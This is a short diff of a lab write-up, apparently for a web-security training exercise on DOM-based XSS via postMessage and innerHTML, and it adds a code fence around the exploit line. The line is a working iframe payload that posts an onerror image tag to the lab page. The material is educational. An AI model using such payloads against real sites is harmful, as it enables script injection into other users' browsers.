@@ -77,5 +77,6 @@ To exploit this vulnerability and trigger XSS:
 By leveraging the `postMessage` method and the insecure handling of `innerHTML`, we successfully exploited the DOM XSS vulnerability. This highlights the importance of validating and sanitizing user inputs in web applications.
 
 
-
+```bash
 <iframe src="https://0a7200bd0434bb86808903a900f100e4.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+```
